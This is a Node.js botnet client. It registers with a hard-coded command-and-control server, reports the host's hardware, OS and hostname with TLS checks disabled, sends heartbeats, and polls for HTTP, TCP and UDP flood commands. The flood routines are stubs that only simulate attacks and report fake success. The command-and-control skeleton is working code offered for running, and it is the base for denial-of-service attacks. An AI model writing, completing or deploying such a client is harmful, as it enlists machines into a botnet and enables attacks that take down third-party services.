// JavaScript Bot Client - FIXED VERSION
// Save as bot_client.js and run: node bot_client.js

const https = require('https');
const crypto = require('crypto');
const os = require('os');

class JavaScriptBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        this.running = true;
        this.approved = false;
        this.activeAttacks = new Set();
        this.connectionRetries = 0;
        this.maxRetryDelay = 300;
        this.heartbeatInterval = 15000; // Send heartbeat every 15 seconds
        
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
            os: os.platform(),
            hostname: os.hostname(),
            capabilities: {
                http: true,
                tcp: true,
                udp: true,
                resource_optimized: true,
                auto_connect: true,
                javascript: true
            }
        };
        
        this.stats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0,
            uptime: Date.now()
        };
        
        this.displayBanner();
    }
    
    displayBanner() {
        console.log('\n' + '='.repeat(60));
        console.log('  JAVASCRIPT BOT CLIENT v1.0 - FIXED');
        console.log('='.repeat(60));
        console.log(`\n[+] BOT ID: ${this.botId}`);
        console.log(`[+] CPU: ${this.specs.cpu_cores} cores`);
        console.log(`[+] RAM: ${this.specs.ram_gb}GB`);
        console.log(`[+] OS: ${this.specs.os}`);
        console.log(`[+] Hostname: ${this.specs.hostname}`);
        console.log(`[+] Server: ${this.serverUrl}`);
        console.log(`[+] Heartbeat: ${this.heartbeatInterval/1000}s intervals`);
        console.log('\n[*] FEATURES:');
        console.log('    [✓] Server-defined threads');
        console.log('    [✓] Auto-reconnect');
        console.log('    [✓] Regular heartbeats');
        console.log('    [✓] Command execution');
        console.log('\n' + '='.repeat(60) + '\n');
    }
    
    sendRequest(endpoint, method = 'GET', data = null) {
        return new Promise((resolve, reject) => {
            const url = new URL(this.serverUrl + endpoint);
            const options = {
                hostname: url.hostname,
                port: url.port || 443,
                path: url.pathname + url.search,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'User-Agent': 'JavaScript-Bot/1.0',
                    'Connection': 'keep-alive'
                },
                rejectUnauthorized: false,
                timeout: 10000
            };
            
            const req = https.request(options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        try {
                            resolve(JSON.parse(responseData));
                        } catch (e) {
                            resolve({ success: true, data: responseData });
                        }
                    } else {
                        reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
                    }
                });
            });
            
            req.on('error', (err) => {
                reject(err);
            });
            
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });
            
            if (data && (method === 'POST' || method === 'PUT')) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async sendHeartbeat() {
        try {
            const data = {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.stats
            };
            
            await this.sendRequest('/check_approval', 'POST', data);
            this.connectionRetries = 0;
            return true;
        } catch (error) {
            console.log(`[!] Heartbeat failed: ${error.message}`);
            return false;
        }
    }
    
    async sendStatus(status, message) {
        try {
            this.stats.uptime = Date.now() - this.stats.uptime;
            
            const data = {
                bot_id: this.botId,
                status: status,
                message: message,
                stats: this.stats,
                active_attacks: this.activeAttacks.size
            };
            
            await this.sendRequest('/status', 'POST', data);
            this.connectionRetries = 0;
            return true;
        } catch (error) {
            console.log(`[!] Status update failed: ${error.message}`);
            return false;
        }
    }
    
    async getCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            this.connectionRetries = 0;
            return response.commands || [];
        } catch (error) {
            throw error;
        }
    }
    
    async executeCommand(cmd) {
        const cmdType = cmd.type;
        
        console.log('\n' + '='.repeat(60));
        console.log(`[→] COMMAND: ${cmdType}`);
        console.log('='.repeat(60));
        
        try {
            switch (cmdType) {
                case 'ping':
                    await this.cmdPing();
                    break;
                case 'http_flood':
                    await this.cmdHttpFlood(cmd);
                    break;
                case 'tcp_flood':
                    await this.cmdTcpFlood(cmd);
                    break;
                case 'udp_flood':
                    await this.cmdUdpFlood(cmd);
                    break;
                case 'sysinfo':
                    await this.cmdSysinfo();
                    break;
                case 'stop_all':
                    await this.cmdStopAll();
                    break;
                default:
                    console.log(`[!] Unknown command: ${cmdType}`);
                    await this.sendStatus('error', `Unknown command: ${cmdType}`);
            }
        } catch (error) {
            console.log(`[!] Error: ${error.message}`);
            await this.sendStatus('error', error.message);
        }
    }
    
    async cmdPing() {
        await this.sendStatus('success', 'pong');
        console.log('[✓] Pong!');
    }
    
    async cmdHttpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 100; // Use server-defined threads
        const method = cmd.method || 'GET';
        
        console.log('[∗] HTTP FLOOD');
        console.log(`    Target: ${target}`);
        console.log(`    Method: ${method}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `${method} FLOOD: ${target}`);
        
        const attackId = `http_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating HTTP flood with ${threads} threads...`);
        
        // Simulate attack duration
        await new Promise(resolve => {
            setTimeout(() => {
                this.activeAttacks.delete(attackId);
                this.stats.total_requests += 1000;
                this.stats.successful_attacks++;
                console.log(`[✓] HTTP flood simulation complete`);
                resolve();
            }, Math.min(duration, 10) * 1000); // Max 10 seconds for simulation
        });
        
        await this.sendStatus('success', `HTTP flood simulated: ${threads} threads`);
    }
    
    async cmdTcpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 75;
        
        console.log('[∗] TCP FLOOD');
        console.log(`    Target: ${target}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `TCP FLOOD: ${target}`);
        
        const attackId = `tcp_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating TCP flood with ${threads} threads...`);
        
        await new Promise(resolve => {
            setTimeout(() => {
                this.activeAttacks.delete(attackId);
                this.stats.total_requests += 500;
                this.stats.successful_attacks++;
                console.log(`[✓] TCP flood simulation complete`);
                resolve();
            }, Math.min(duration, 10) * 1000);
        });
        
        await this.sendStatus('success', `TCP flood simulated: ${threads} threads`);
    }
    
    async cmdUdpFlood(cmd) {
        const target = cmd.target;
        const duration = cmd.duration || 60;
        const threads = cmd.threads || 75;
        
        console.log('[∗] UDP FLOOD');
        console.log(`    Target: ${target}`);
        console.log(`    Duration: ${duration}s`);
        console.log(`    Threads: ${threads} (Server-defined)`);
        
        this.stats.total_attacks++;
        await this.sendStatus('running', `UDP FLOOD: ${target}`);
        
        const attackId = `udp_${Date.now()}`;
        this.activeAttacks.add(attackId);
        
        console.log(`[+] Simulating UDP flood with ${threads} threads...`);
        
        await new Promise(resolve => {
            setTimeout(() => {
                this.activeAttacks.delete(attackId);
                this.stats.total_requests += 500;
                this.stats.successful_attacks++;
                console.log(`[✓] UDP flood simulation complete`);
                resolve();
            }, Math.min(duration, 10) * 1000);
        });
        
        await this.sendStatus('success', `UDP flood simulated: ${threads} threads`);
    }
    
    async cmdSysinfo() {
        const info = [
            `CPU Cores: ${this.specs.cpu_cores}`,
            `RAM: ${this.specs.ram_gb}GB`,
            `OS: ${this.specs.os}`,
            `Hostname: ${this.specs.hostname}`,
            `Active Attacks: ${this.activeAttacks.size}`,
            `Total Attacks: ${this.stats.total_attacks}`,
            `Total Requests: ${this.stats.total_requests.toLocaleString()}`
        ].join('\n');
        
        console.log('[∗] System Info:\n' + info);
        await this.sendStatus('success', info);
    }
    
    async cmdStopAll() {
        console.log('[!] Stopping all attacks...');
        const count = this.activeAttacks.size;
        this.activeAttacks.clear();
        console.log(`[✓] Stopped ${count} attacks`);
        await this.sendStatus('success', `Stopped ${count} attacks`);
    }
    
    async run() {
        // Initial connection
        console.log('[*] Connecting to server...');
        
        let connected = false;
        while (!connected && this.running) {
            try {
                const data = {
                    bot_id: this.botId,
                    specs: this.specs,
                    stats: this.stats
                };
                
                const response = await this.sendRequest('/check_approval', 'POST', data);
                
                if (response.approved) {
                    connected = true;
                    this.approved = true;
                    this.connectionRetries = 0;
                    
                    console.log('\n' + '='.repeat(60));
                    console.log('  BOT APPROVED! READY FOR OPERATIONS');
                    console.log('='.repeat(60) + '\n');
                    console.log('[✓] Connected successfully!');
                    console.log(`[✓] Bot ID: ${this.botId}`);
                    console.log(`[✓] Client Type: JavaScript`);
                    console.log(`[✓] Sending heartbeats every ${this.heartbeatInterval/1000}s\n`);
                    
                    // Send initial status
                    await this.sendStatus('connected', 'JavaScript bot connected');
                } else {
                    console.log('[!] Not approved, retrying in 5s...');
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
            } catch (error) {
                this.connectionRetries++;
                const delay = Math.min(5000 * Math.pow(2, this.connectionRetries), 30000);
                
                console.log(`[!] Connection failed: ${error.message}`);
                console.log(`[...] Retry ${this.connectionRetries} in ${delay/1000}s...`);
                
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        // Start heartbeat interval
        const heartbeatTimer = setInterval(async () => {
            if (this.running) {
                await this.sendHeartbeat();
                console.log(`[${new Date().toLocaleTimeString()}] Heartbeat sent`);
            }
        }, this.heartbeatInterval);
        
        // Main command loop
        while (this.running && this.approved) {
            try {
                // Check for commands
                const commands = await this.getCommands();
                
                if (commands.length > 0) {
                    console.log(`[+] Received ${commands.length} command(s)`);
                    for (const cmd of commands) {
                        // Execute command without blocking
                        this.executeCommand(cmd).catch(console.error);
                    }
                }
                
                // Wait before next poll
                await new Promise(resolve => setTimeout(resolve, 5000));
                
            } catch (error) {
                console.log(`[!] Command poll failed: ${error.message}`);
                
                // Try to reconnect
                this.approved = false;
                clearInterval(heartbeatTimer);
                await new Promise(resolve => setTimeout(resolve, 5000));
                await this.run(); // Reconnect
                return;
            }
        }
        
        clearInterval(heartbeatTimer);
    }
}

// Run the bot
console.log('\n' + '='.repeat(60));
console.log('  JAVASCRIPT BOT CLIENT - FIXED');
console.log('='.repeat(60));

const bot = new JavaScriptBot();

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log('\n[!] Shutting down...');
    bot.running = false;
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n[!] Terminating...');
    bot.running = false;
    process.exit(0);
});

// Start the bot
bot.run().catch(error => {
    console.error('[!] Fatal error:', error);
    process.exit(1);
});
